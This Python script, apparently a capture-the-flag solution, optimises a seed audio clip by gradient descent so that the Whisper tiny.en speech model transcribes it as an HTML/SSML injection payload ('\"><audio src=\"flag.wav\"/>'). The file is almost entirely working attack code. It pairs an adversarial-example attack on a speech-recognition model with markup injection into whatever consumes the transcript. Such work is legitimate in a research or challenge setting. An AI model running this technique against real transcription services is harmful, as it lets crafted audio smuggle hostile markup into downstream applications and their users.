"""Create an audio input that tiny.en decodes to an SSML audio element."""

from __future__ import annotations

import wave
from pathlib import Path

import numpy as np
import torch
import torch.nn.functional as F
import whisper
from faster_whisper.audio import decode_audio


ROOT = Path(__file__).resolve().parents[1]
SEED_AUDIO = ROOT / "analysis" / "target" / "t01.mp3"
OUTPUT = ROOT / "analysis" / "adversarial.wav"
TARGET_TEXT = ' The HTML code.\"><audio src="flag.wav"/>'
SAMPLE_RATE = 16_000
DURATION = 8


def save_wav(path: Path, samples: np.ndarray) -> None:
    pcm = (np.clip(samples, -1, 1) * 32767).astype("<i2")
    with wave.open(str(path), "wb") as wav:
        wav.setnchannels(1)
        wav.setsampwidth(2)
        wav.setframerate(SAMPLE_RATE)
        wav.writeframes(pcm.tobytes())


def main() -> None:
    if not torch.cuda.is_available():
        raise SystemExit("CUDA is required for this optimization")

    torch.manual_seed(20260913)
    model = whisper.load_model("tiny.en", device="cuda")
    model.train(False)
    tokenizer = whisper.tokenizer.get_tokenizer(multilingual=False)
    target = tokenizer.encode(TARGET_TEXT) + [tokenizer.eot]
    prefix = list(tokenizer.sot_sequence) + [tokenizer.no_timestamps]

    seed = decode_audio(str(SEED_AUDIO), sampling_rate=SAMPLE_RATE)
    size = DURATION * SAMPLE_RATE
    seed = np.pad(seed[:size], (0, max(0, size - len(seed))))
    audio = torch.tensor(seed, device="cuda", dtype=torch.float32).requires_grad_()
    optimizer = torch.optim.Adam([audio], lr=0.002)
    target_tensor = torch.tensor(target, device="cuda", dtype=torch.long)
    token_input = torch.tensor(
        [prefix + target[:-1]], device="cuda", dtype=torch.long
    )

    for step in range(1, 1001):
        optimizer.zero_grad(set_to_none=True)
        quantized = audio + ((audio * 32767).round() / 32767 - audio).detach()
        mel = whisper.log_mel_spectrogram(
            quantized, padding=whisper.audio.N_SAMPLES - size
        )
        encoded = model.encoder(mel.unsqueeze(0))
        logits = model.decoder(token_input, encoded)
        start = len(prefix) - 1
        selected = logits[:, start : start + len(target), :]
        token_losses = F.cross_entropy(
            selected.reshape(-1, selected.shape[-1]), target_tensor, reduction="none"
        )
        weights = torch.ones_like(token_losses)
        weights[(target_tensor == 22039) | (target_tensor == 6927)] = 20.0
        loss = (token_losses * weights).sum() / weights.sum()
        loss = loss + 0.00005 * audio.square().mean()
        loss.backward()
        optimizer.step()
        with torch.no_grad():
            audio.clamp_(-1, 1)

        predicted = selected.argmax(dim=-1)[0].tolist()
        if step == 1 or step % 25 == 0:
            print(step, float(loss), repr(tokenizer.decode(predicted)), flush=True)
        if loss.item() < 0.005:
            break

    samples = audio.detach().cpu().numpy()
    save_wav(OUTPUT, samples)
    result = model.transcribe(samples, language="en", temperature=0, fp16=True)
    print("saved", OUTPUT)
    print("transcript", repr(result["text"]))


if __name__ == "__main__":
    main()
